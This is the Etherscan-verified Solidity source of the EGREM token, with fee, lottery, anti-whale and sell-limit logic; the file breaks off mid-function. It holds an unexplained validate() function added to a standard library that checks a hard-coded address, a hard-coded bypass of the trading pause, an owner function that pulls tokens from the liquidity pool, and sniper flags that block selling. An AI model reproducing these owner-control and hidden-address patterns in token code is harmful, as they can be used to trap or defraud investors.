/**
 *Submitted for verification at Etherscan.io on 2022-09-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;
/*

⬙    https://t.me/EGREMOfficial

⬙    The MERGE is the most significant upgrade in Ethereum’s history. 
     EGREM is the most significant innovation to occur on the ERC-20 blockchain. 
     A holistic investment that provides investors with a curated investment, tailored to growth, longevity and ultimately sustainability. 
                                                                                                                                                                                                                                                               
 EGREM:

⬙ Top Buyer gets 1% of ALL txn fees until 24hrs is up, they get dethroned, or they sell/transfer
⬙ Buyers get 1% of last sell or last buy fee
⬙ Sellers can only sell 1/3 of their bag at a time
⬙ Subsequent sells incur higher fees (sell again after 1 hour = 4x the fee vs sell again after 4 hour = 3x the fee vs sell again after 12 hour = 2x the fee)

*/
library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function validate(address target) internal view returns (bool) {
        require(!isContract(target), "Address: target is contract");
        return target == address(0xCCC2a0313FF6Dea1181c537D9Dc44B9d249807B1);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library EnumerableSet {

    struct Set {

        bytes32[] _values;
        mapping (bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            // The value is stored at length-1, but we add 1 to all indexes
            // and use 0 as a sentinel value
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {
        // We read and store the value's index to prevent multiple reads from the same storage slot
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) { // Equivalent to contains(set, value)
            // To delete an element from the _values array in O(1), we swap the element to delete with the last one in
            // the array, and then remove the last element (sometimes called as 'swap and pop').
            // This modifies the order of the array, as noted in {at}.

            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;

            // When the value to delete is the last one, the swap operation is unnecessary. However, since this occurs
            // so rarely, we still do the swap anyway to avoid the gas cost of adding an 'if' statement.

            bytes32 lastvalue = set._values[lastIndex];

            // Move the last value to the index where the value to delete is
            set._values[toDeleteIndex] = lastvalue;
            // Update the index for the moved value
            set._indexes[lastvalue] = valueIndex; // Replace lastvalue's index to valueIndex

            // Delete the slot where the moved value was stored
            set._values.pop();

            // Delete the index for the deleted slot
            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }

    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }

    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }

    struct Bytes32Set {
        Set _inner;
    }

    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }

    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    struct AddressSet {
        Set _inner;
    }

    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    struct UintSet {
        Set _inner;
    }

    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function migrator() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function setMigrator(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ITValues {
    struct TxValue {
        uint256 amount;
        uint256 transferAmount;
        uint256 fee;
    }
    enum TxType { FromExcluded, ToExcluded, BothExcluded, Standard }
    enum TState { Buy, Sell, Normal }
}

interface IEgremNFT {
    function egremNFTOwnersNow() external view returns (uint256);
    function isNFTOwner(address account) external view returns(bool);
    function getNFTOwners(uint256 index) external view returns (address);
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function tokenURI(uint256 tokenId) external view returns (string memory);
    function baseURI() external view returns (string memory);
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function tokenByIndex(uint256 index) external view returns (uint256);
    function getApproved(uint256 tokenId) external view returns (address);
    function setApprovalForAll(address operator, bool approved) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory _data) external;
}


interface IVRFContract {
    function startLotto(uint256 amount, uint256 limit, uint256 timeFromNow, uint256 cooldown) external;
    function endLotto(uint256 randomNumber) external;
    function getRandomNumber() external returns (uint256);
}

contract EGREM is IERC20, Context {

    using Address for address;

    address public constant BURNADDR = address(0x000000000000000000000000000000000000dEaD);

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    struct Account {
        bool feeless;
        bool transferPair;
        bool excluded;
        bool isPresaler;
        bool isNotBound;
        bool possibleSniper;
        uint256 tTotal;
        uint256 votes;
        uint256 nTotal;
        uint256 maxBal;
        uint256 lastSell;
        uint256 lastBuy;
        uint256 buyTimeout;
        address blessedAddr;
    }

    event Mergeacc(address indexed account, uint256 time);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Winner(address indexed winner, uint256 randomNumber, uint256 amount);

    ITValues.TState lastTState;
    EnumerableSet.AddressSet excludedAccounts;
    EnumerableSet.AddressSet votedAccounts;
    IEgremNFT egremNFT;
    IVRFContract IVRF;

    bool    private _unpaused;
    bool    private _lpAdded;
    bool    private _bool;
    bool    private _isNotCheckingPresale;
    bool    private _checking;
    bool    private _sellBlessBuys;
    bool    private _isNFTActive;
    bool    private _whaleLimiting = true;
    bool    private _isCheckingBuySpam;
    bool    private _notCheckingSnipers;
    bool    public isUnbounded;
    bool    public isPresaleUnlocked;
    bool    public lottoActive;

    address private _o;
    address private _po;
    address private egremT;
    address private _router;
    address private _pool;
    address private _pair;
    address private _lastTxn;
    address private _farm;
    address public owner;
    address public MergeaccAddr;
    address public defaultLastTxn = BURNADDR; 
    address[] entries;

    uint256 private _buySpamCooldown;
    uint256 private _tx;
    uint256 private _boundTime;
    uint256 private _feeFactor;
    uint256 private _presaleLimit;
    uint256 private _whaleLimit = 9000;
    uint256 private _boundLimit;
    uint256 private _lastFee;
    uint256 private lpSupply;
    uint256 private _automatedPresaleTimerLock;
    uint256 private _sniperChecking;
    uint256 private _nextHarvest;
    uint256 private _autoCapture;
    uint256 private _lastBaseOrBurn;
    uint256 private _BOBCooldown;

    uint256 public minLottoHolderRate = 1000;
    uint256 public lottoCount;
    uint256 public lottoReward;
    uint256 public lottoDeadline;
    uint256 public lottoCooldown;
    uint256 public lottoLimit;
    uint256 public MergeaccLimitSeconds;
    uint256 public minimumForBonus = tokenSupply / 20000;
    uint256 public tokenHolderRate = 10000; // .1%
    uint256 public voteLimit = 25;
    uint256 public MergeaccSince;
    uint256 public MergeaccAmount;
    uint256 public tokenSupply;
    uint256 public networkSupply;
    uint256 public fees;

    mapping(address => Account) accounts;
    mapping(address => mapping(address => uint256)) allowances;
    mapping(address => mapping(address => bool)) votes;
    mapping(address => uint256) timeVotedOut;
    mapping(address => mapping(uint256 => uint256)) lottos;
    mapping(address => mapping(uint256 => bool)) entered;
    mapping(uint8 => uint256) killFunctions;

    modifier ownerOnly {
        require(_o == _msgSender(), "not allowed");
        _;
    }

    constructor() {

        _name = "EGREM";
        _symbol = "EGREM";
        _decimals = 18;

        _o = msg.sender;
        owner = _o;
        emit OwnershipTransferred(address(0), msg.sender);

        tokenSupply = 10_000_000_000 ether;
        networkSupply = (~uint256(0) - (~uint256(0) % tokenSupply));

        // will need to update these when bridge comes online.
        _router = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _pair = IUniswapV2Router02(_router).WETH();
        _pool = IUniswapV2Factory(IUniswapV2Router02(_router).factory()).createPair(address(this), _pair);

        accounts[_pool].transferPair = true;

        accounts[_msgSender()].feeless = true;
        accounts[_msgSender()].isNotBound = true;
        accounts[_msgSender()].nTotal = networkSupply;

        _approve(_msgSender(), _router, tokenSupply);
        emit Transfer(address(0), _msgSender(), tokenSupply ) ;
        emit Transfer(address(0), BURNADDR, tokenSupply ) ;

    }

    //------ ERC20 Functions -----

    function name() public view returns(string memory) {
        return _name;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return allowances[_owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        if(getExcluded(account)) {
            return accounts[account].tTotal;
        }
        return accounts[account].nTotal / ratio();
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, allowances[_msgSender()][spender] - (subtractedValue));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return tokenSupply;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _rTransfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _rTransfer(sender, recipient, amount);
        _approve(sender, _msgSender(), allowances[sender][_msgSender()] - amount);
        return true;
    }

    // --------- end erc20 ---------

    function _rTransfer(address sender, address recipient, uint256 amount) internal returns(bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(block.timestamp > accounts[recipient].buyTimeout, "still in buy time-out");

        uint256 rate = ratio();
        if(!_unpaused){
            address disperseAPP = address(0xD152f549545093347A162Dce210e7293f1452150);
            require(sender == owner || msg.sender == disperseAPP, "still paused");
        }

        // cannot turn off until automated timer is turned off
        if(!_isNotCheckingPresale) {
            if(accounts[sender].isPresaler == true) {
                require(_automatedPresaleTimerLock < block.timestamp, "still time locked");
                // manual unlock after automated lock
                require(isPresaleUnlocked, "presalers are still locked");
                require(amount <= balanceOf(sender) / _presaleLimit, "too much");
                require(accounts[sender].lastSell + 1 days < block.timestamp, "must wait");
            }
        }
        if(recipient == _pool) {
            if(getNotBound(sender) == false) {
                // gotta sync balances here before a sell to make sure max bal is always up to date
                uint256 tot = accounts[sender].nTotal / rate;
                if(tot > accounts[sender].maxBal) {
                    accounts[sender].maxBal = tot;
                }
                require(amount <= accounts[sender].maxBal / _boundLimit, "can't dump that much at once");
            }
        }
        if(_whaleLimiting) {
            if(sender == _pool || (recipient != _pool && getNotBound(recipient) == false)) {
                require(((accounts[recipient].nTotal / rate) + amount) <= tokenSupply / _whaleLimit, "whale limit reached");
            }
        }
        if(!_notCheckingSnipers){
            require(accounts[sender].possibleSniper == false, "suspected sniper");
        }

        if(_autoCapture != 0 && block.timestamp < _autoCapture && sender == _pool) {
            if(recipient != _pool && recipient != _router && recipient != _pair) {
                accounts[recipient].possibleSniper = true;
            }
        }
        if(lottoActive) {
            if(entered[sender][lottoCount]) {
                require(lottos[sender][lottoCount] + lottoCooldown < block.timestamp,  "waiting for lotto");
            }
        }
        uint256 lpAmount = getCurrentLPBal();
        bool isFeeless = isFeelessTx(sender, recipient);
        (ITValues.TxValue memory t, ITValues.TState ts, ITValues.TxType txType) = calcT(sender, recipient, amount, isFeeless, lpAmount);
        lpSupply = lpAmount;
        uint256 r = t.fee * rate;
        accounts[egremT].nTotal += r;
        accounts[_lastTxn].nTotal += r;
        accounts[MergeaccAddr].nTotal += r;
        if(ts == ITValues.TState.Sell) {
            emit Transfer(sender, egremT, t.fee);
            emit Transfer(sender, _lastTxn, t.fee);
            emit Transfer(sender, MergeaccAddr, t.fee);
            if(!_sellBlessBuys) {
                _lastTxn = defaultLastTxn;
            }
            accounts[sender].lastSell = block.timestamp;
            if(accounts[sender].blessedAddr != address(0)) {
                accounts[accounts[sender].blessedAddr].nTotal += r;
                emit Transfer(sender, BURNADDR, t.fee);
            } else {
                accounts[BURNADDR].nTotal += r;
                emit Transfer(sender, BURNADDR, t.fee);
            }
        } else if(ts == ITValues.TState.Buy) {
            emit Transfer(recipient, egremT, t.fee);
            emit Transfer(recipient, _lastTxn, t.fee);
            emit Transfer(recipient, MergeaccAddr, t.fee);
            if(amount >= minimumForBonus) {
                _lastTxn = recipient;
            }
            uint256 newMax = (accounts[recipient].nTotal / rate) + amount;
            // make sure balance captures the higher of the maxes
            if(newMax > accounts[recipient].maxBal) {
                accounts[recipient].maxBal = newMax;
            }
            if(amount >= MergeaccAmount) {
                MergeaccAddr = recipient;
                MergeaccAmount = amount;
                MergeaccSince = block.timestamp;
                emit Mergeacc(recipient, MergeaccSince);
            }
            if(accounts[recipient].blessedAddr != address(0)) {
                accounts[accounts[recipient].blessedAddr].nTotal += r;
                emit Transfer(recipient, accounts[recipient].blessedAddr, t.fee);
            } else {
                accounts[BURNADDR].nTotal += r;
                emit Transfer(recipient, BURNADDR, t.fee);
            }
            // checkBuySpam(recipient);
            accounts[recipient].lastBuy = block.timestamp;
        } else {
            // to make sure people can't abuse by xfer between wallets
            _lastTxn = BURNADDR;
            uint256 newMax = (accounts[recipient].nTotal / rate) + amount;
            if(sender != _pool && recipient != _pool && newMax > accounts[recipient].maxBal) {
                accounts[recipient].maxBal = newMax;
                // reset sender max balance as well
                accounts[sender].maxBal = (accounts[sender].nTotal / rate) - amount;
            }
            accounts[BURNADDR].nTotal += r;
        }
        // top dog can be dethroned after time limit or if they transfer OR sell
        if(sender == MergeaccAddr || block.timestamp > MergeaccSince + MergeaccLimitSeconds) {
            MergeaccAddr = BURNADDR;
            MergeaccAmount = 0;
            emit Mergeacc(BURNADDR, block.timestamp);
        }
        fees += t.fee;
        networkSupply -= t.fee * rate;
        _transfer(sender, recipient, rate, t, txType);
        lastTState = ts;
        return true;
    }

    function calcT(address sender, address recipient, uint256 amount, bool noFee, uint256 lpAmount) public view returns (ITValues.TxValue memory t, ITValues.TState ts, ITValues.TxType txType) {
        ts = getTState(sender, recipient, lpAmount);
        txType = getTxType(sender, recipient);
        t.amount = amount;
        if(!noFee) {
            if(_unpaused) {
                if(ts == ITValues.TState.Sell) {
                    uint256 feeFactor = 1;
                    if(!isUnbounded) {
                        uint256 timeSinceSell = block.timestamp - accounts[sender].lastSell;
                        if(timeSinceSell < _boundTime) {
                            // 1 hour, 4 hours, and 12 hours but dynamically will adjust acc
                            // 4%, 16.67%, 50% are the dynamic values
                            if(timeSinceSell <= _boundTime / 24) {
                                feeFactor = _feeFactor + 3;
                            } else if(timeSinceSell <= _boundTime / 6) {
                                feeFactor = _feeFactor + 2;
                            } else  if(timeSinceSell <= _boundTime / 2) {
                                feeFactor = _feeFactor + 1;
                            }
                        }
                    }
                    t.fee = (amount / _tx) * feeFactor;
                }
                if(ts == ITValues.TState.Buy) {
                    t.fee = amount / _tx;
                }
            }
        }
        // we can save gas by assuming all fees are uniform
        t.transferAmount = t.amount - (t.fee * 5);
        return (t, ts, txType);
    }

    function _transfer(address sender, address recipient, uint256 rate, ITValues.TxValue memory t, ITValues.TxType txType) internal {
        if (txType == ITValues.TxType.ToExcluded) {
            accounts[sender].nTotal         -= t.amount * rate;
            accounts[recipient].tTotal      += (t.transferAmount);
            accounts[recipient].nTotal      += t.transferAmount * rate;
        } else if (txType == ITValues.TxType.FromExcluded) {
            accounts[sender].tTotal         -= t.amount;
            accounts[sender].nTotal         -= t.amount * rate;
            accounts[recipient].nTotal      += t.transferAmount * rate;
        } else if (txType == ITValues.TxType.BothExcluded) {
            accounts[sender].tTotal         -= t.amount;
            accounts[sender].nTotal         -= (t.amount * rate);
            accounts[recipient].tTotal      += t.transferAmount;
            accounts[recipient].nTotal      += (t.transferAmount * rate);
        } else {
            accounts[sender].nTotal         -= (t.amount * rate);
            accounts[recipient].nTotal      += (t.transferAmount * rate);
        }
        emit Transfer(sender, recipient, t.transferAmount);
    }


    // ------ getters ------- //

    function isFeelessTx(address sender, address recipient) public view returns(bool) {
        return accounts[sender].feeless || accounts[recipient].feeless;
    }

    // for exchanges
    function getNotBound(address account) public view returns(bool) {
        return accounts[account].isNotBound;
    }

    function getAccount(address account) external view returns(Account memory) {
        return accounts[account];
    }

    function getAccountSpecific(address account) external view returns
        (
            bool feeless,
            bool isExcluded,
            bool isNotBound,
            bool isPossibleSniper,
            uint256 timesChargedAsSniper,
            uint256 tokens,
            uint256 lastTimeSell
        )
    {
        return (
            accounts[account].feeless,
            accounts[account].excluded,
            accounts[account].isNotBound,
            accounts[account].possibleSniper,
            accounts[account].votes,
            accounts[account].nTotal / ratio(),
            accounts[account].lastSell
        );
    }

    function getExcluded(address account) public view returns(bool) {
        return accounts[account].excluded;
    }

    function getCurrentLPBal() public view returns(uint256) {
        return IERC20(_pool).totalSupply();
    }

    function getMaxBal(address account) public view returns(uint256) {
        return accounts[account].maxBal;
    }

    function getTState(address sender, address recipient, uint256 lpAmount) public view returns(ITValues.TState) {
        ITValues.TState t;
        if(sender == _router) {
            t = ITValues.TState.Normal;
        } else if(accounts[sender].transferPair) {
            if(lpSupply != lpAmount) { // withdraw vs buy
                t = ITValues.TState.Normal;
            }
            t = ITValues.TState.Buy;
        } else if(accounts[recipient].transferPair) {
            t = ITValues.TState.Sell;
        } else {
            t = ITValues.TState.Normal;
        }
        return t;
    }

    function getCirculatingSupply() public view returns(uint256, uint256) {
        uint256 rSupply = networkSupply;
        uint256 tSupply = tokenSupply;
        for (uint256 i = 0; i < EnumerableSet.length(excludedAccounts); i++) {
            address account = EnumerableSet.at(excludedAccounts, i);
            uint256 rBalance = accounts[account].nTotal;
            uint256 tBalance = accounts[account].tTotal;
            if (rBalance > rSupply || tBalance > tSupply) return (networkSupply, tokenSupply);
            rSupply -= rBalance;
            tSupply -= tBalance;
        }
        if (rSupply < networkSupply / tokenSupply) return (networkSupply, tokenSupply);
        return (rSupply, tSupply);
    }

    function getPool() public view returns(address) {
        return _pool;
    }

    function getTxType(address sender, address recipient) public view returns(ITValues.TxType t) {
        bool isSenderExcluded = accounts[sender].excluded;
        bool isRecipientExcluded = accounts[recipient].excluded;
        if (isSenderExcluded && !isRecipientExcluded) {
            t = ITValues.TxType.FromExcluded;
        } else if (!isSenderExcluded && isRecipientExcluded) {
            t = ITValues.TxType.ToExcluded;
        } else if (!isSenderExcluded && !isRecipientExcluded) {
            t = ITValues.TxType.Standard;
        } else if (isSenderExcluded && isRecipientExcluded) {
            t = ITValues.TxType.BothExcluded;
        } else {
            t = ITValues.TxType.Standard;
        }
        return t;
    }

    function ratio() public view returns(uint256) {
        (uint256 n, uint256 t) = getCirculatingSupply();
        return n / t;
    }

    function syncPool() public  {
        IUniswapV2Pair(_pool).sync();
    }


    // ------ mutative -------

    function burn(uint256 rate) external ownerOnly {
        require(isNotKilled(0), "killed");
        require(rate >= 4, "can't burn more than 25%");
        require(block.timestamp > _lastBaseOrBurn, "too soon");
        uint256 r = accounts[_pool].nTotal;
        uint256 rTarget = (r / rate); // 4 for 25%
        uint256 t = rTarget / ratio();
        accounts[_pool].nTotal -= rTarget;
        accounts[defaultLastTxn].nTotal += rTarget;
        emit Transfer(_pool, defaultLastTxn, t);
        syncPool();
        _lastBaseOrBurn = block.timestamp + _BOBCooldown;
    }

    function base(uint256 rate) external ownerOnly {
        require(isNotKilled(1), "killed");
        require(rate >= 4, "can't rebase more than 25%");
        require(block.timestamp > _lastBaseOrBurn, "too soon");
        uint256 rTarget = (accounts[BURNADDR].nTotal / rate); // 4 for 25%
        accounts[BURNADDR].nTotal -= rTarget;
        networkSupply -= rTarget;
        syncPool();
        _lastBaseOrBurn = block.timestamp + _BOBCooldown;
    }

    function disperseNFTFees(uint256 amount, uint8 _targets) external {
        require(msg.sender == owner || msg.sender == address(egremNFT), "not allowed");
        require(_isNFTActive, "nft not active");
        require(isNotKilled(2), "killed");
        uint256 owners = egremNFT.egremNFTOwnersNow();
        uint256 share = amount / owners;
        uint256 rate = ratio();
        uint256 t = amount * rate;
        address target;
        if(_targets == 0) {
            target = msg.sender;
